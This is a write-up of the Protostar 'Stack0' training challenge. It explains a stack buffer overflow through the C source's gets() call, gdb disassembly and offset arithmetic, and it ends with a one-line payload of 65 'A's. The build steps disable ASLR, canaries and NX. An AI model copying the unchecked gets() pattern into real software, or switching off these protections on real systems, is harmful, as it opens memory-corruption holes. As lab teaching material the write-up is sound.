## Protostar-Stack0 Solution

### 1. Introduction

This is a poc solution for the "Stack0" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419082620/https://exploit-exercises.com/protostar/stack0/](https://web.archive.org/web/20170419082620/https://exploit-exercises.com/protostar/stack0/) 


**Hints:**
* This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

The if statement checks whether the variable "modified" is "**0**" (zero) or not. The goal of this challenge is to modify this variable and set its value to anything rather than "**0**" zero. 

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 0 0.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Set intel syntax.
3. Disassemble the main function.

```nasm
$ gdb -q 0
Reading symbols from 0...
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080491b6 <+0>:	endbr32 
   0x080491ba <+4>:	lea    ecx,[esp+0x4]
   0x080491be <+8>:	and    esp,0xfffffff0
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0x50
   0x080491cc <+22>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491d1 <+27>:	add    ebx,0x2e2f
   0x080491d7 <+33>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080491de <+40>:	sub    esp,0xc
   0x080491e1 <+43>:	lea    eax,[ebp-0x4c]
   0x080491e4 <+46>:	push   eax
   0x080491e5 <+47>:	call   0x8049070 <gets@plt>
   0x080491ea <+52>:	add    esp,0x10
   0x080491ed <+55>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080491f0 <+58>:	test   eax,eax
   0x080491f2 <+60>:	je     0x8049208 <main+82>
   0x080491f4 <+62>:	sub    esp,0xc
   0x080491f7 <+65>:	lea    eax,[ebx-0x1ff8]
   0x080491fd <+71>:	push   eax
   0x080491fe <+72>:	call   0x8049080 <puts@plt>
   0x08049203 <+77>:	add    esp,0x10
   0x08049206 <+80>:	jmp    0x804921a <main+100>
   0x08049208 <+82>:	sub    esp,0xc
   0x0804920b <+85>:	lea    eax,[ebx-0x1fcf]
   0x08049211 <+91>:	push   eax
   0x08049212 <+92>:	call   0x8049080 <puts@plt>
   0x08049217 <+97>:	add    esp,0x10
   0x0804921a <+100>:	mov    eax,0x0
   0x0804921f <+105>:	lea    esp,[ebp-0x8]
   0x08049222 <+108>:	pop    ecx
   0x08049223 <+109>:	pop    ebx
   0x08049224 <+110>:	pop    ebp
   0x08049225 <+111>:	lea    esp,[ecx-0x4]
   0x08049228 <+114>:	ret       
End of assembler dump.
```

Let's have a quick look at some parts of the output.

```nasm
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0x50
```
Since the stack grows to lower addresses, compiler used instruction **sub** to decrease the value in stack pointer by **0x50**.

```x86asm
gdb-peda$ p/d 0x50
80
```
So, 80 bytes for stack - 4 pushes = 64 bytes char array.

> 4*4 = 16

> 80 - 16 = 64

The char offset which has **64** bytes of length as I see.

It's also possible to estimate the offset length by using several approaches, but not limited to, Brute Force via terminal interaction (manually, bash, py...etc), py-gdb scripting, or checking stack via debugging.

Another calculation for the offset length.

```nasm
...
   0x080491d7 <+33>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080491de <+40>:	sub    esp,0xc
   0x080491e1 <+43>:	lea    eax,[ebp-0x4c]
...
```

Since the stack grows to lower addresses, compiler decided to use the  instruction **sub** to decrease the value on stack pointer by **0xc** (12) .

```x86asm
gdb-peda$ p/d 0x4c
$1 = 76
gdb-peda$ p/d 0xc
$2 = 12
```

> 76-12 = 64

The funtion **gets()** doesn't check offset length while receiving a user-generated input. By exploiting this vulnerable function usage, it's possible to modify the variable **modified** the goal would be achieved. 

Recap the statement.

```c
if(modified != 0)
```

#### 2.2 Quick Solution

Let's set a breakpoint at addresses **0x08049212** and **0x080491fe** then run the program. Both are the addresses where  **puts** is called (**\<puts@plt\>**).

```nasm
gdb-peda$ b* 0x08049212
Breakpoint 1 at 0x8049212: file 0.c, line 16.
gdb-peda$ b * 0x080491fe
Breakpoint 2 at 0x80491fe: file 0.c, line 14.
```

```x86asm
gdb-peda$ r
Starting program: ./0 
AAAAAAAAA
...TRIM...
Breakpoint 1, 0x08049212 in main (argc=0x1, argv=0xffffd1f4) at 0.c:16
16	      printf("Try again?\n");
```

```x86asm
gdb-peda$ print modified
$1 = 0x0
```

Okay, the variable **modified** equals to **0x0** therefore it prints out "Try again?\n" message.

Let's use 65 uppercase "A" characters then observe output of the same commands. As we calculated the offset length as 64, the offset will be overwritten with this character hence modified is set to the following value.

```x86asm
gdb-peda$ r <<< $(python2 -c 'print "A"*65')
Starting program: /home/thomas/Desktop/protostar/0 <<< $(python2 -c 'print "A"*65')
...TRIM...
Breakpoint 2, 0x080491fe in main (argc=0x1, argv=0xffffd1f4) at 0.c:14
14	      printf("you have changed the 'modified' variable\n");
```
```x86asm
gdb-peda$ print modified
$3 = 0x41
```

It seems like it worked, a PoC in gdb-peda would be as follows.

```py
r <<< $(python2 -c 'print "A"*65')
```

#### 2.3 Final PoC

```py
$ python2 -c "print 'A'*65" | ./0
```
